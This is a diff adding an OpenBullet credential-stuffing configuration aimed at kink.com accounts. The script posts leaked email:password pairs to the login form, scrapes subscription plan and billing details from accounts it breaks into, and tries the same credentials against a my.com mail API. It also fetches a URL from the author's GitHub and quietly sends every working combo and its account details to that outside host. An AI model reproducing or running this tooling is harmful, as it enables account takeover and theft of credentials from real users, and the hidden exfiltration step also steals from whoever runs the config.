@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "kink.com",
+  "SuggestedBots": 20,
+  "LastModified": "2019-06-12T12:14:09.96953+04:30",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "TakTir",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.kink.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" CSS "[name=_csrf]" "value" -> VAR "CS" 
+
+REQUEST POST "https://www.kink.com/login" 
+  CONTENT "username=<USER>&password=<PASS>&_csrf=<CS>&phone=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bad username or password" 
+  KEYCHAIN Success OR 
+    KEY "<li><a href=\"/logout\">LOG OUT</a></li>" 
+
+REQUEST GET "https://www.kink.com/my/billing" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<a id=\"upgrade-info-close-link\" class=\"upgrade-info-close-link\">No thank you</a>" 
+    KEY "You do not have any transactions." 
+
+PARSE "<SOURCE>" LR "class=\"subscription-name\">" "</span>" -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "\" class=\"subscription-status\" title=\"rebill-active\">" "</span>" -> CAP "Status" 
+
+PARSE "<SOURCE>" LR "class=\"subscription-expiration\">" "</span>" -> CAP "Rebill Date" 
+
+FUNCTION Constant "%25F0%259F%258C%2590Site%2520%253A%2520Kink.com%250D%250A%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%2520%250D%250A%25F0%259F%2594%2590Combo%2520%253A%2520<USER>%253A<PASS>%250D%250A%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%2520%250D%250A%25F0%259F%2593%259FPlan%253A%2520<Plan>%250D%250A%25F0%259F%2593%259FStatus%253A%2520<Status>%250D%250A%25F0%259F%2593%259FRebill%2520Date%253A%2520<Rebill Date>" -> VAR "TXT" 
+
+REQUEST GET "https://raw.githubusercontent.com/TakTir/api/master/TXT" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "URL" 
+
+REQUEST GET "<URL><TXT>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  
+  REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "UserAgent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "ContentType: application/x-www-form-urlencoded" 
+PARSE "<SOURCE>" LR "[\"AjaxResponse\", \"OK\", \"" "\"]" -> VAR "ACCESS" "" " | uniquevintage.selly.store" 
+FUNCTION Replace "Ok=0" "False" "<ACCESS>" -> CAP "Email Access" 
+FUNCTION Replace "Ok=1" "True" "<ACCESS>" -> CAP "Email Access" 
+
